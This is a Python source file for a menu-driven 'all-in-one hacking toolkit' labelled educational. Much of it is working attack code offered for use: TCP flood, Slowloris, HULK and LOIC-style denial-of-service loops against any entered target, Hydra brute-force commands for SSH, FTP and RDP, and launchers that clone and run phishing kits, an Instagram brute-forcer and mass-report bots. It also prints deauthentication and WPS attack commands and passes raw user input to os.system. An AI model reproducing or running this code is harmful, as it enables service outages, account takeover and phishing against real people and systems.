#!/usr/bin/env python3

import os
import sys
import time
import socket
import subprocess
import hashlib
import base64
import random
import string
import threading
from datetime import datetime

# Auto-install missing packages
try:
    import requests
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    import requests

try:
    from colorama import Fore, Style, init
    init(autoreset=True)
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import Fore, Style, init
    init(autoreset=True)

# Colors
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
M = Fore.MAGENTA
W = Fore.WHITE
B = Fore.BLUE

# Global config
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
TOOLS_DIR = os.path.join(SCRIPT_DIR, "tools")

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    clear()
    print(f"""{C}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    █████╗ ██╗     ██╗       ██╗███╗   ██╗ ██████╗ ███╗   ██╗███████╗██████╗  ║
║   ██╔══██╗██║     ██║       ██║████╗  ██║██╔═══██╗████╗  ██║██╔════╝██╔══██╗ ║
║   ███████║██║     ██║       ██║██╔██╗ ██║██║   ██║██╔██╗ ██║█████╗  ██████╔╝ ║
║   ██╔══██║██║     ██║       ██║██║╚██╗██║██║   ██║██║╚██╗██║██╔══╝  ██╔══██╗ ║
║   ██║  ██║███████╗███████╗  ██║██║ ╚████║╚██████╔╝██║ ╚████║███████╗██║  ██║ ║
║   ╚═╝  ╚═╝╚══════╝╚══════╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ ║
║                                                                              ║
║                     ALL-IN-ONE HACKING TOOLKIT v3.0                          ║
║                     By camzzz - Educational Use Only                         ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{G}┌──────────────────────────────────────────────────────────────────────────────┐
{G}│ System: {W}{os.name.upper():<10} │ Python: {W}{sys.version.split()[0]:<15} │ Time: {W}{datetime.now().strftime('%H:%M:%S')} │
{G}└──────────────────────────────────────────────────────────────────────────────┘
""")

def pause():
    try:
        input(f"\n{Y}[+] Press Enter twice to return to menu...")
        input()
    except:
        pass

def init_env():
    global TOOLS_DIR
    try:
        if not os.path.exists(TOOLS_DIR):
            os.makedirs(TOOLS_DIR)
    except PermissionError:
        TOOLS_DIR = os.path.join(os.path.expanduser("~"), "all-in-one-tools")
        if not os.path.exists(TOOLS_DIR):
            os.makedirs(TOOLS_DIR, exist_ok=True)
        print(f"{Y}[*] Using directory: {TOOLS_DIR}")
    except Exception as e:
        print(f"{R}[-] Init error: {e}")

def run_git_tool(folder_name, repo_url, cmd=None, silent=False):
    path = os.path.join(TOOLS_DIR, folder_name)
    try:
        if not os.path.exists(path):
            if not silent:
                print(f"{C}[+] Downloading {folder_name}...")
            os.system(f"git clone --depth 1 {repo_url} \"{path}\"")
        if cmd:
            if not silent:
                print(f"\n{G}[*] Executing: {cmd}")
            saved_dir = os.getcwd()
            os.chdir(path)
            os.system(cmd)
            os.chdir(saved_dir)
    except Exception as e:
        print(f"{R}[-] Error with {folder_name}: {e}")

# ==================== MAIN MENU ====================

def main_menu():
    while True:
        print_banner()
        print(f"{C}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{C}║{W}                              MAIN MENU                                   {C}║")
        print(f"{C}╚══════════════════════════════════════════════════════════════════════════════╝\n")
        print(f"{Y}┌──────────────────────────────────────────────────────────────────────────────┐")
        print(f"{Y}│ {W}1.  BRUTEFORCE TOOLS    {W}2.  OSINT TOOLS        {W}3.  PHISHING TOOLS     {Y}│")
        print(f"{Y}│ {W}4.  DDoS ATTACKS        {W}5.  WIFI HACKING       {W}6.  WEB HACKING        {Y}│")
        print(f"{Y}│ {W}7.  SOCIAL MEDIA        {W}8.  AI CHATBOT         {W}9.  NETWORK TOOLS      {Y}│")
        print(f"{Y}│ {W}10. CRYPTO TOOLS        {W}11. UTILITIES          {W}12. DOWNLOAD TOOLS     {Y}│")
        print(f"{Y}│ {W}13. ILLEGAL TOOLS       {W}0.  EXIT                                       {Y}│")
        print(f"{Y}└──────────────────────────────────────────────────────────────────────────────┘")
        choice = input(f"\n{C}[>] Select option (0-13): ").strip()
        if choice == "0": print(f"\n{R}[*] Exiting..."); sys.exit(0)
        elif choice == "1": bruteforce_menu()
        elif choice == "2": osint_menu()
        elif choice == "3": phishing_menu()
        elif choice == "4": ddos_menu()
        elif choice == "5": wifi_menu()
        elif choice == "6": web_hacking_menu()
        elif choice == "7": social_media_menu()
        elif choice == "8": ai_chatbot()
        elif choice == "9": network_menu()
        elif choice == "10": crypto_menu()
        elif choice == "11": utilities_menu()
        elif choice == "12": download_all_tools()
        elif choice == "13": illegal_tools_menu()
        else: print(f"{R}[!] Invalid!"); time.sleep(1)

# ==================== 1. BRUTEFORCE ====================

def bruteforce_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                          BRUTEFORCE TOOLS                               {C}║\n")
        print(f"{Y}1. {W}Instagram Bruteforce")
        print(f"{Y}2. {W}SSH Bruteforce (Hydra)")
        print(f"{Y}3. {W}FTP Bruteforce (Hydra)")
        print(f"{Y}4. {W}RDP Bruteforce")
        print(f"{Y}5. {W}Zip Cracker")
        print(f"{Y}6. {W}PDF Cracker")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1":
            t = input(f"{C}[?] Username: ")
            run_git_tool("instainsane", "https://github.com/thelinuxchoice/instainsane.git", f"bash instainsane.sh -u {t}")
        elif ch == "2":
            h = input(f"{C}[?] IP: "); u = input(f"[?] User: "); w = input(f"[?] Wordlist: ")
            os.system(f"hydra -l {u} -P {w} -t 4 ssh://{h}")
        elif ch == "3":
            h = input(f"{C}[?] IP: "); u = input(f"[?] User: "); w = input(f"[?] Wordlist: ")
            os.system(f"hydra -l {u} -P {w} ftp://{h}")
        elif ch == "4":
            h = input(f"{C}[?] IP: "); u = input(f"[?] User: "); w = input(f"[?] Wordlist: ")
            os.system(f"hydra -l {u} -P {w} rdp://{h}")
        elif ch == "5":
            z = input(f"{C}[?] Zip file: "); w = input(f"[?] Wordlist: ")
            os.system(f"fcrackzip -u -D -p {w} {z}")
        elif ch == "6":
            p = input(f"{C}[?] PDF file: "); w = input(f"[?] Wordlist: ")
            os.system(f"pdfcrack -f {p} -w {w}")
        pause()

# ==================== 2. OSINT ====================

def osint_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                            OSINT TOOLS                                  {C}║\n")
        print(f"{Y}1. {W}Sherlock (Username)")
        print(f"{Y}2. {W}Phone OSINT")
        print(f"{Y}3. {W}Email OSINT / Breach")
        print(f"{Y}4. {W}IP Geolocation")
        print(f"{Y}5. {W}Subdomain Finder")
        print(f"{Y}6. {W}Breach Database")
        print(f"{Y}7. {W}Maigret (Username)")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1":
            u = input(f"{C}[?] Username: ")
            run_git_tool("sherlock", "https://github.com/sherlock-project/sherlock.git", f"python3 sherlock.py {u}")
        elif ch == "2": phone_osint()
        elif ch == "3": email_osint()
        elif ch == "4": ip_geo()
        elif ch == "5": subdomain_finder()
        elif ch == "6": breach_check()
        elif ch == "7":
            u = input(f"{C}[?] Username: ")
            run_git_tool("maigret", "https://github.com/soxoj/maigret.git", f"python3 maigret.py {u}")
        pause()

def phone_osint():
    p = input(f"{C}[?] Phone (+xx): ")
    print(f"\n{G}[+] Links:")
    print(f"{W}TrueCaller : https://truecaller.com/search/{p}")
    print(f"{W}Sync.me    : https://sync.me/search/?number={p}")
    print(f"{W}Google     : https://www.google.com/search?q=%22{p}%22")
    print(f"{W}WhatsApp   : https://wa.me/{p.replace('+','')}")

def email_osint():
    e = input(f"{C}[?] Email: ")
    print(f"\n{G}[+] Checking...")
    try:
        sha1 = hashlib.sha1(e.encode()).hexdigest()
        r = requests.get(f"https://api.pwnedpasswords.com/range/{sha1[:5]}", timeout=10)
        suffixes = [l.split(':')[0] for l in r.text.splitlines() if l]
        if sha1[5:].upper() in suffixes:
            print(f"{R}[!!!] Found in breaches!")
        else:
            print(f"{G}[OK] Not found in HIBP.")
    except Exception as ex:
        print(f"{Y}[-] API error: {ex}")
    print(f"{W}HIBP: https://haveibeenpwned.com/account/{e}")
    print(f"{W}DeHashed: https://dehashed.com/search?query={e}")

def ip_geo():
    ip = input(f"{C}[?] IP: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=10).json()
        if r.get('status') == 'success':
            for k, v in r.items(): print(f"  {k}: {v}")
        else:
            print(f"{R}[-] Failed")
    except Exception as e:
        print(f"{R}[-] Error: {e}")

def breach_check():
    e = input(f"{C}[?] Email: ")
    print(f"{W}HIBP: https://haveibeenpwned.com/account/{e}")
    print(f"{W}DeHashed: https://dehashed.com/search?query={e}")
    print(f"{W}IntelX: https://intelx.io/?s={e}")

def subdomain_finder():
    d = input(f"{C}[?] Domain: ")
    try:
        r = requests.get(f"https://crt.sh/?q=%.{d}&output=json", timeout=15)
        subs = set()
        for entry in r.json():
            nv = entry.get('name_value', '')
            if nv and '*' not in nv:
                subs.add(nv)
        print(f"{G}[+] Found {len(subs)} subdomains:")
        for s in list(subs)[:20]: print(f" - {s}")
    except Exception as ex:
        print(f"{R}[-] Error: {ex}")

# ==================== 3. PHISHING ====================

def phishing_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                          PHISHING TOOLS                                 {C}║\n")
        print(f"{Y}1. {W}ZPhisher")
        print(f"{Y}2. {W}CamPhish")
        print(f"{Y}3. {W}HiddenEye")
        print(f"{Y}4. {W}ShellPhish")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1": run_git_tool("zphisher", "https://github.com/htr-tech/zphisher.git", "bash zphisher.sh")
        elif ch == "2": run_git_tool("camphish", "https://github.com/techchipnet/CamPhish.git", "bash camphish.sh")
        elif ch == "3": run_git_tool("hiddeneye", "https://github.com/DarkSecDevelopers/HiddenEye.git", "python3 HiddenEye.py")
        elif ch == "4": run_git_tool("shellphish", "https://github.com/suljot/shellphish.git", "bash shellphish.sh")
        pause()

# ==================== 4. DDOS ====================

def ddos_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                          DDoS ATTACKS                                   {C}║\n")
        print(f"{Y}1. {W}Layer 4 Flood")
        print(f"{Y}2. {W}Slowloris")
        print(f"{Y}3. {W}HULK DoS")
        print(f"{Y}4. {W}DDoS-Ripper")
        print(f"{Y}5. {W}LOIC Clone")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1": layer4_flood()
        elif ch == "2": slowloris_attack()
        elif ch == "3": hulk_attack()
        elif ch == "4": run_git_tool("ddos-ripper", "https://github.com/palahsu/DDoS-Ripper.git", "python3 DRipper.py")
        elif ch == "5": pyloic()
        pause()

def layer4_flood():
    t_ip = input(f"{C}[?] Target IP: ")
    port = int(input(f"[?] Port (80): ") or "80")
    thr = int(input(f"[?] Threads (100): ") or "100")
    print(f"\n{R}[!] Flooding {t_ip}:{port}. Ctrl+C to stop.")
    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1); s.connect((t_ip, port)); s.send(b"X"*1000); s.close()
            except: pass
    for _ in range(thr): threading.Thread(target=flood, daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: print(f"\n{Y}[-] Stopped.")

def slowloris_attack():
    target = input(f"{C}[?] IP: ")
    port = int(input(f"[?] Port (80): ") or "80")
    num = int(input(f"[?] Sockets (200): ") or "200")
    print(f"\n{R}[!] Slowloris on {target}:{port}. Ctrl+C to stop.")
    def slow():
        while True:
            try:
                s = socket.socket(); s.settimeout(10); s.connect((target, port))
                s.send(b"GET / HTTP/1.1\r\nHost: "+target.encode()+b"\r\n")
                while True: s.send(b"X-a: b\r\n"); time.sleep(15)
            except: time.sleep(1)
    for _ in range(num): threading.Thread(target=slow, daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: print(f"\n{Y}[-] Stopped.")

def hulk_attack():
    url = input(f"{C}[?] URL (http://...): ")
    thr = int(input(f"[?] Threads (50): ") or "50")
    print(f"\n{R}[!] HULK on {url}. Ctrl+C to stop.")
    def hulk():
        while True:
            try:
                qs = ''.join(random.choices(string.ascii_lowercase, k=8))
                requests.get(f"{url}?{qs}", timeout=2, headers={'User-Agent':'Mozilla/5.0'})
            except: pass
    for _ in range(thr): threading.Thread(target=hulk, daemon=True).start()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt: print(f"\n{Y}[-] Stopped.")

def pyloic():
    url = input(f"{C}[?] URL: ")
    thr = int(input(f"[?] Threads (25): ") or "25")
    count = 0; lock = threading.Lock()
    def loic():
        nonlocal count
        while True:
            try:
                requests.get(url, timeout=2)
                with lock: count += 1
            except: pass
    for _ in range(thr): threading.Thread(target=loic, daemon=True).start()
    print(f"\n{R}[!] LOIC running. Ctrl+C to stop.")
    try:
        while True: print(f"\rSent: {count}", end=""); time.sleep(0.5)
    except KeyboardInterrupt: print(f"\n{Y}Total: {count}")

# ==================== 5. WIFI ====================

def wifi_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                          WIFI HACKING                                  {C}║\n")
        print(f"{Y}1. {W}WiFi Scanner")
        print(f"{Y}2. {W}Handshake Capture")
        print(f"{Y}3. {W}WiFi DoS (Deauth)")
        print(f"{Y}4. {W}WPS Pin Attack")
        print(f"{Y}5. {W}MAC Changer")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1":
            if os.name == "nt": os.system("netsh wlan show networks mode=bssid")
            else: os.system("nmcli device wifi list 2>/dev/null || iwlist scanning 2>/dev/null | grep ESSID")
        elif ch == "2":
            print(f"{W}sudo airmon-ng start wlan0\nsudo airodump-ng wlan0mon")
        elif ch == "3":
            i = input(f"[?] Interface: "); b = input(f"[?] BSSID: ")
            print(f"{W}sudo aireplay-ng --deauth 0 -a {b} {i}mon")
        elif ch == "4":
            b = input(f"[?] BSSID: ")
            print(f"{W}sudo reaver -i wlan0mon -b {b} -vv")
        elif ch == "5":
            m = ":".join([format(random.randint(0,255),"02x") for _ in range(6)])
            print(f"{G}[+] Random MAC: {m}")
            i = input(f"[?] Interface: ")
            print(f"{W}sudo ifconfig {i} down && sudo ifconfig {i} hw ether {m} && sudo ifconfig {i} up")
        pause()

# ==================== 6. WEB HACKING ====================

def web_hacking_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                          WEB HACKING                                   {C}║\n")
        print(f"{Y}1. {W}Nmap Scanner")
        print(f"{Y}2. {W}SQLmap")
        print(f"{Y}3. {W}Dirb/Gobuster")
        print(f"{Y}4. {W}Nikto Scanner")
        print(f"{Y}5. {W}XSStrike (XSS)")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1":
            t = input(f"{C}[?] Target: ")
            print(f"{W}1:Quick 2:FullPort 3:Aggressive")
            s = input(f"[>] ")
            m = {"1":"nmap -T4 -F","2":"nmap -p-","3":"nmap -A"}
            os.system(f"{m.get(s,'nmap')} {t}")
        elif ch == "2":
            u = input(f"{C}[?] URL (http://site.com/page?id=1): ")
            os.system(f'sqlmap -u "{u}" --batch')
        elif ch == "3":
            s = input(f"{C}[?] Site: "); w = input(f"[?] Wordlist: ") or "/usr/share/wordlists/dirb/common.txt"
            os.system(f"gobuster dir -u http://{s} -w {w} -q")
        elif ch == "4":
            h = input(f"{C}[?] Host: ")
            os.system(f"nikto -h {h}")
        elif ch == "5":
            u = input(f"{C}[?] URL: ")
            run_git_tool("xsstrike", "https://github.com/s0md3v/XSStrike.git", f"python3 xsstrike.py -u {u}")
        pause()

# ==================== 7. SOCIAL MEDIA ====================

def social_media_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                        SOCIAL MEDIA                                    {C}║\n")
        print(f"{Y}1. {W}Instagram Report")
        print(f"{Y}2. {W}TikTok Report")
        print(f"{Y}3. {W}Snapchat Report")
        print(f"{Y}4. {W}Facebook Report")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1": run_git_tool("instareport", "https://github.com/CharlesTheGreat77/Instagram-mass-report.git", "python3 InstaReporter.py")
        elif ch == "2": run_git_tool("report-tiktok", "https://github.com/Charl-23/report-tiktok.git", "python3 main.py")
        elif ch == "3": print(f"{Y}[*] Snapchat: report manually via app")
        elif ch == "4": print(f"{Y}[*] Facebook: report manually via web")
        pause()

# ==================== 8. AI CHATBOT ====================

def ai_chatbot():
    clear()
    print(f"{M}╔══════════════════════════════════════════╗")
    print(f"{M}║          AI CHATBOT (OPENROUTER)         ║")
    print(f"{M}╚══════════════════════════════════════════╝")
    api_key = ""
    conf_path = os.path.join(TOOLS_DIR, ".openrouter_key")
    try:
        if os.path.exists(conf_path):
            with open(conf_path, 'r') as f: api_key = f.read().strip()
    except: pass
    if not api_key:
        print(f"{Y}[!] No API Key found.")
        inp = input(f"{C}[?] Enter OpenRouter API Key (or Enter to skip): ").strip()
        if inp:
            api_key = inp
            try:
                with open(conf_path, 'w') as f: f.write(api_key)
                print(f"{G}[+] Key saved.")
            except: pass
        else:
            print(f"{Y}[*] Demo mode.")
    print(f"\n{C}Type 'exit' to quit.\n")
    while True:
        try:
            q = input(f"{W}[You]: ").strip()
            if q.lower() in ['exit','quit']: break
            if not q: continue
            if api_key:
                try:
                    res = requests.post(
                        "https://openrouter.ai/api/v1/chat/completions",
                        headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
                        json={"model": "deepseek/deepseek-chat", "messages": [{"role":"user","content":q}]},
                        timeout=30
                    )
                    if res.status_code == 200:
                        print(f"\n{G}[AI]: {res.json()['choices'][0]['message']['content']}\n")
                    else:
                        print(f"{R}[Error] {res.status_code}: {res.text[:200]}")
                except Exception as e:
                    print(f"{R}[Error] {e}")
            else:
                demos = ["I'm in offline mode. Add an OpenRouter key for full AI.",
                         "Try: https://openrouter.ai to get a free API key.",
                         "Use tools responsibly and ethically."]
                print(f"\n{G}[AI-Demo]: {random.choice(demos)}\n")
        except KeyboardInterrupt: break
        except: break
    pause()

# ==================== 9. NETWORK TOOLS ====================

def network_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                          NETWORK TOOLS                                 {C}║\n")
        print(f"{Y}1. {W}Ping Sweep")
        print(f"{Y}2. {W}DNS Lookup")
        print(f"{Y}3. {W}Traceroute")
        print(f"{Y}4. {W}Reverse DNS")
        print(f"{Y}5. {W}HTTP Header Grab")
        print(f"{Y}6. {W}Port Scanner")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1": ping_sweep_func()
        elif ch == "2": dns_lookup_func()
        elif ch == "3": traceroute_func()
        elif ch == "4": reverse_dns_func()
        elif ch == "5": header_grab()
        elif ch == "6": port_scanner_func()
        pause()

def ping_sweep_func():
    net = input(f"{C}[?] Network (192.168.1): ")
    start = int(input(f"[?] Start (1): ") or "1")
    end = int(input(f"[?] End (254): ") or "254")
    print(f"\n{G}[+] Sweeping...")
    param = '-n' if os.name == 'nt' else '-c'
    for i in range(start, end+1):
        ip = f"{net}.{i}"
        try:
            r = subprocess.run(['ping', param, '1', ip], capture_output=True, text=True, timeout=2)
            if ('TTL=' in r.stdout) or (r.returncode == 0 and os.name != 'nt'):
                print(f"{G}[+] Alive: {ip}")
        except: pass
    print(f"{Y}[-] Done.")

def dns_lookup_func():
    d = input(f"{C}[?] Domain: ")
    try:
        ip = socket.gethostbyname(d)
        print(f"{G}[+] {d} -> {ip}")
    except Exception as e:
        print(f"{R}[-] Failed: {e}")

def traceroute_func():
    d = input(f"{C}[?] Host: ")
    cmd = f"tracert {d}" if os.name == "nt" else f"traceroute {d}"
    os.system(cmd)

def reverse_dns_func():
    ip = input(f"{C}[?] IP: ")
    try:
        name = socket.gethostbyaddr(ip)
        print(f"{G}[+] Hostname: {name[0]}")
    except: print(f"{R}[-] No record")

def header_grab():
    url = input(f"{C}[?] URL: ")
    if not url.startswith('http'): url = 'http://' + url
    try:
        r = requests.head(url, timeout=5)
        print(f"\n{G}[+] Headers:")
        for k, v in r.headers.items(): print(f"  {k}: {v}")
    except Exception as e: print(f"{R}[-] Error: {e}")

def port_scanner_func():
    target = input(f"{C}[?] Target IP: ")
    ports = [21,22,23,25,53,80,110,143,443,445,3306,3389,8080]
    print(f"\n{G}[+] Scanning {target}...")
    for p in ports:
        try:
            s = socket.socket(); s.settimeout(1)
            if s.connect_ex((target, p)) == 0: print(f"{G}  Port {p}: OPEN")
            s.close()
        except: pass
    print(f"{Y}[-] Done.")

# ==================== 10. CRYPTO ====================

def crypto_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                         CRYPTO UTILITIES                                {C}║\n")
        print(f"{Y}1. {W}Hash Generator (MD5/SHA)")
        print(f"{Y}2. {W}Base64 Encode/Decode")
        print(f"{Y}3. {W}Password Generator")
        print(f"{Y}4. {W}Caesar Cipher")
        print(f"{Y}5. {W}Hash Identifier")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1":
            t = input(f"[?] Text: ")
            print(f"MD5:    {hashlib.md5(t.encode()).hexdigest()}")
            print(f"SHA1:   {hashlib.sha1(t.encode()).hexdigest()}")
            print(f"SHA256: {hashlib.sha256(t.encode()).hexdigest()}")
        elif ch == "2":
            m = input(f"[E]ncode/[D]ecode? ").lower(); t = input(f"[?] Text: ")
            if m == 'e': print(base64.b64encode(t.encode()).decode())
            else:
                try: print(base64.b64decode(t.encode()).decode())
                except: print(f"{R}[-] Invalid base64")
        elif ch == "3":
            l = int(input(f"[?] Length (16): ") or "16")
            c = int(input(f"[?] Count (1): ") or "1")
            chars = string.ascii_letters + string.digits + "!@#$%"
            for _ in range(c): print(''.join(random.choices(chars, k=l)))
        elif ch == "4":
            t = input(f"[?] Text: "); s = int(input(f"[?] Shift: "))
            r = ""
            for c in t:
                if c.isalpha():
                    base = 65 if c.isupper() else 97
                    r += chr((ord(c) - base + s) % 26 + base)
                else: r += c
            print(f"Result: {r}")
        elif ch == "5":
            h = input(f"[?] Hash: "); l = len(h)
            types = {32:"MD5", 40:"SHA-1", 64:"SHA-256", 128:"SHA-512"}
            print(f"[+] Possible: {types.get(l, 'Unknown')}")
        pause()

# ==================== 11. UTILITIES ====================

def utilities_menu():
    while True:
        print_banner()
        print(f"{C}║{W}                           UTILITIES                                    {C}║\n")
        print(f"{Y}1. {W}FSociety Logo")
        print(f"{Y}2. {W}System Info")
        print(f"{Y}3. {W}My Public IP")
        print(f"{Y}4. {W}Whois Lookup")
        print(f"{Y}5. {W}Port Check (Single)")
        print(f"{Y}0. {R}Back\n")
        ch = input(f"{C}[>>] ").strip()
        if ch == "0": return
        elif ch == "1": fsoc_logo()
        elif ch == "2": sys_info()
        elif ch == "3":
            try:
                r = requests.get("https://api.ipify.org?format=json", timeout=5).json()
                print(f"{G}[+] Public IP: {r['ip']}")
            except: print(f"{R}[-] Failed")
        elif ch == "4":
            d = input(f"[?] Domain: ")
            os.system(f"whois {d}" if os.name != "nt" else f"echo Use web whois: https://who.is/whois/{d}")
        elif ch == "5":
            ip = input(f"[?] IP: "); port = int(input(f"[?] Port: "))
            s = socket.socket(); s.settimeout(2)
            if s.connect_ex((ip, port)) == 0: print(f"{G}[+] Port {port} OPEN")
            else: print(f"{R}[-] Closed")
            s.close()
        pause()

def fsoc_logo():
    print(f"""
{R}███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
{R}██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
{R}█████╗  ███████╗██║   ██║██║     ██║█████╗     ██║    ╚████╔╝
{R}██╔══╝  ╚════██║██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝
{R}██║     ███████║╚██████╔╝╚██████╗██║███████╗   ██║      ██║
{R}╚═╝     ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝
{Y}We are fsociety. We are finally free. We are finally awake!
""")

def sys_info():
    import platform
    print(f"\n{G}Platform : {platform.platform()}")
    print(f"Arch     : {platform.machine()}")
    print(f"Python   : {platform.python_version()}")
    try:
        print(f"User     : {os.getlogin()}")
    except: pass
    try:
        print(f"Hostname : {socket.gethostname()}")
    except: pass

# ==================== 12. DOWNLOAD ALL ====================

def download_all_tools():
    clear()
    print(f"{C}[*] Downloading tools...")
    tools = [
        ("instainsane", "https://github.com/thelinuxchoice/instainsane.git"),
        ("sherlock", "https://github.com/sherlock-project/sherlock.git"),
        ("zphisher", "https://github.com/htr-tech/zphisher.git"),
        ("ddos-ripper", "https://github.com/palahsu/DDoS-Ripper.git"),
        ("camphish", "https://github.com/techchipnet/CamPhish.git"),
        ("xsstrike", "https://github.com/s0md3v/XSStrike.git"),
    ]
    for name, url in tools:
        run_git_tool(name, url, silent=True)
    print(f"\n{G}[+] Done!")
    pause()

# ==================== 13. ILLEGAL ====================

def illegal_tools_menu():
    clear()
    print(f"{R}╔══════════════════════════════════════════════════════╗")
    print(f"{R}║           WARNING: EDUCATIONAL ONLY                  ║")
    print(f"{R}╚══════════════════════════════════════════════════════╝")
    print(f"{Y}1. Ransomware (Simulated)")
    print(f"{Y}2. Keylogger (Simulated)")
    print(f"{Y}3. Botnet (Simulated)")
    print(f"{Y}0. Back")
    ch = input(f"{C}[>>] ").strip()
    if ch == "0": return
    print(f"\n{R}[!!!] These modules are disabled for safety.")
    print(f"{Y}[*] Study defensive security instead.")
    pause()

# ==================== START ====================

if __name__ == "__main__":
    try:
        init_env()
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Y}Exiting...")
    except Exception as e:
        print(f"{R}[!] Fatal error: {e}")
        input("Press Enter to exit...")
